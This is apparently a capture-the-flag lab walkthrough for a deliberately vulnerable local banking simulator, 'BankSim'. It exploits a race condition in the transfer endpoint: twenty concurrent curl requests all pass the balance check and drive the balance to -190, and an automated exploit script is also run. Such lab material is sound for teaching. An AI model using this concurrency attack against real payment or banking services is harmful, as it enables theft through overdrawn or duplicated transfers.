# Walkthrough: Race Conditions

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "service": "BankSim v1.0",
  "endpoints": [
    "GET  /balance",
    "POST /deposit?amount=<n>",
    "POST /transfer?amount=<n>"
  ]
}
```

## Step 1: Check the Starting Balance

```bash
curl http://localhost:8080/balance
```

Output:
```json
{
  "balance": 10
}
```

## Step 2: Try a Single Transfer

```bash
curl -X POST "http://localhost:8080/transfer?amount=5"
```

Output:
```json
{
  "transferred": 5,
  "balance": 5
}
```

The balance decreased by 5. A sequential transfer works correctly.

## Step 3: Race 20 Concurrent Transfers

The balance is now 5, insufficient to transfer 10. Reset it first:

```bash
curl -X POST "http://localhost:8080/deposit?amount=5"
```

Balance is back to 10. Now fire 20 concurrent transfers:

```bash
for i in $(seq 20); do
  curl -s -X POST "http://localhost:8080/transfer?amount=10" &
done
wait
```

Check the balance:

```bash
curl http://localhost:8080/balance
```

Output:
```json
{
  "balance": -190,
  "flag": "POC{...}"
}
```

All 20 requests passed the balance check (balance=10 >= amount=10) before any deduction ran, then all 20 deducted 10, driving the balance to -190.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080
[*] Service: BankSim v1.0
[*] Starting balance: 10

[*] Launching 20 concurrent transfers of amount=10...
[*] Final balance: -190

[+] Flag: POC{...}
```
